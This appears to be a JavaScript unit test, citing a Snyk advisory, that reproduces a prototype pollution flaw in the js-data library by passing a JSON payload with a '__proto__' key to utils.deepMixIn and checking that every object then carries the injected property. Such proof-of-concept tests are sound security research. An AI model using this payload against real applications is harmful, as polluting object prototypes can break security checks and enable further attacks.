//https://snyk.io/vuln/SNYK-JS-JSDATA-1023655
test("prototype pollution in js-data", () => {
  expect({}.polluted).toBe(undefined);

  const { utils } = require("js-data");
  const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  utils.deepMixIn({}, source);

  expect({}.polluted).toBe("yes");
});
